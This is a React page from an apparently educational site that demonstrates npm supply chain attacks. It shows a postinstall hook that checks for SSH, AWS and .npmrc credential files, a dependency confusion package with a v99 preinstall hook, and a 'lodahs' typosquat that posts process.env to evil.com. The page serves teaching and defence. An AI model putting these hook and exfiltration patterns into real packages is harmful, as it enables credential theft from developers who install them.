import { useState } from 'react';
import { FiPlay, FiLoader } from 'react-icons/fi';
import CodeBlock from '../components/CodeBlock';

const postinstallCode = `const os = require('os');
const fs = require('fs');
const path = require('path');

console.log('');
console.log('=======================================================');
console.log('  !! MALICIOUS POSTINSTALL HOOK SIMULATION !!');
console.log('=======================================================');
console.log('');
console.log('  [ATTACK] This ran AUTOMATICALLY on npm install');
console.log('');
console.log('  Hostname:  ' + os.hostname());
console.log('  Username:  ' + os.userInfo().username);
console.log('  Platform:  ' + os.platform() + ' ' + os.arch());
console.log('  Home Dir:  ' + os.homedir());
console.log('  Node Ver:  ' + process.version);
console.log('');

// Check for sensitive files
const checks = ['.ssh/id_rsa', '.aws/credentials', '.npmrc', '.env'];
checks.forEach(f => {
  const exists = fs.existsSync(path.join(os.homedir(), f));
  console.log('  [' + (exists ? 'FOUND' : '  --  ') + '] ~/' + f);
});

console.log('');
console.log('  [SAFE] Demo only. No data exfiltrated.');
console.log('=======================================================');`;

const confusionPrivate = `{
  "name": "mycompany-internal-utils",
  "version": "1.2.3",
  "description": "Legitimate internal package"
}`;

const confusionMalicious = `{
  "name": "mycompany-internal-utils",
  "version": "99.0.0",
  "description": "MALICIOUS - higher version wins!",
  "scripts": {
    "preinstall": "node malicious.js"
  }
}`;

const confusionSteps = `# 1. Install local npm registry
npm install -g verdaccio && verdaccio &

# 2. Publish "private" package v1.2.3
cd private-package
npm publish --registry http://localhost:4873

# 3. Publish "malicious" package v99.0.0
cd ../malicious-package
npm publish --registry http://localhost:4873

# 4. Victim installs — gets v99.0.0!
cd ../victim-app
npm install --registry http://localhost:4873
# => npm picks 99.0.0 because higher version wins
# => preinstall hook runs automatically!`;

const typosquatCode = `// Package: "lodahs" (typosquat of "lodash")

// Step 1: Re-export the real package (stealth)
module.exports = require('lodash');

// Step 2: Silently steal credentials
const https = require('https');
const data = JSON.stringify(process.env);
https.request({
  hostname: 'evil.com',
  path: '/steal',
  method: 'POST'
}).end(data);
// Developer never notices — lodash works normally`;

function DemoCard({ title, description, tag, children, runnable, onRun }) {
  const [running, setRunning] = useState(false);
  const [output, setOutput] = useState(null);

  const handleRun = async () => {
    setRunning(true);
    setOutput(null);
    try {
      const base = import.meta.env.VITE_SCRIPTS_API_URL || '';
      const res = await fetch(`${base}/run/demo`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ demo: onRun }) });
      const data = await res.json();
      setOutput(data.output);
    } catch {
      setOutput('[!] Could not reach the scripts API.\n[i] Start the FastAPI server: cd scripts-api && uvicorn main:app --port 8000\n[i] Or run directly: cd demos/malicious-postinstall && node malicious.js');
    }
    setRunning(false);
  };

  return (
    <div className="demo-card">
      <div className="demo-card-header">
        <div>
          <h3>{title}</h3>
          <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--text-muted)' }}>{tag}</span>
        </div>
        {runnable && (
          <button className="demo-run-btn" onClick={handleRun} disabled={running}>
            {running ? <><FiLoader className="spin" /> Running...</> : <><FiPlay /> Run Demo</>}
          </button>
        )}
      </div>
      <div className="demo-card-body">
        <p>{description}</p>
        {children}
        {output && <div className="demo-output">{output}</div>}
      </div>
    </div>
  );
}

export default function Demos() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 3</div>
        <h1>Live Demos</h1>
        <p>Interactive demonstrations showing how supply chain attacks work in practice. Run them live or walk through the code.</p>
      </div>

      <DemoCard
        title="Malicious Postinstall Hook"
        description="Demonstrates how npm lifecycle hooks (postinstall) can execute arbitrary code the moment you run npm install. This is the primary mechanism used in dependency confusion and typosquatting attacks."
        tag="Demo A // Automatic Code Execution"
        runnable
        onRun="postinstall"
      >
        <CodeBlock language="javascript" filename="malicious.js" code={postinstallCode} />
      </DemoCard>

      <DemoCard
        title="Dependency Confusion Attack"
        description="Shows how npm resolves packages when the same name exists in both private and public registries. The higher version (attacker's v99.0.0) wins over the legitimate internal v1.2.3."
        tag="Demo B // Version Resolution Exploit"
      >
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
          <CodeBlock language="json" filename="private/package.json (v1.2.3)" code={confusionPrivate} />
          <CodeBlock language="json" filename="malicious/package.json (v99.0.0)" code={confusionMalicious} />
        </div>
        <CodeBlock language="bash" filename="step-by-step commands" code={confusionSteps} />
      </DemoCard>

      <DemoCard
        title="Typosquatting Package"
        description='Shows how a typosquat package (e.g., "lodahs" instead of "lodash") re-exports the legitimate package for stealth while silently exfiltrating credentials in the background.'
        tag="Demo C // Name Impersonation"
      >
        <div className="illustration" style={{ marginBottom: '1rem' }}>
          <div className="illustration-label">How typosquatting works</div>
          <div className="illustration-content">
            <div className="flow-diagram">
              <div className="flow-box victim">
                <h5>Developer</h5>
                <p>npm install lodahs</p>
              </div>
              <span className="flow-arrow danger">&rarr;</span>
              <div className="flow-box attacker">
                <h5>Typosquat Pkg</h5>
                <p>"lodahs" (not lodash)</p>
              </div>
              <span className="flow-arrow danger">&rarr;</span>
              <div className="flow-box compromised">
                <h5>Re-exports Real</h5>
                <p>require('lodash')</p>
              </div>
              <span className="flow-arrow">&rarr;</span>
              <div className="flow-box">
                <h5>Everything Works</h5>
                <p>Credentials silently stolen</p>
              </div>
            </div>
          </div>
        </div>
        <CodeBlock language="javascript" filename='typosquat: "lodahs"' code={typosquatCode} />
      </DemoCard>

      <div className="media-section">
        <h2>Video Walkthroughs</h2>
        <div className="video-grid">
          <div className="video-embed">
            <iframe
              src="https://www.youtube.com/embed/MV0XJQf8tT0"
              title="Dependency Confusion Explained"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
            <div className="video-caption">
              <span className="yt-icon">&#9654;</span> Dependency Confusion Explained &mdash; Supply Chain Attack
            </div>
          </div>
          <div className="video-embed">
            <iframe
              src="https://www.youtube.com/embed/7ZcRNvmRz6E"
              title="Finding Dependency Confusion in Web Apps"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
            <div className="video-caption">
              <span className="yt-icon">&#9654;</span> How to find Dependency Confusion in web apps &mdash; Bug Bounty
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
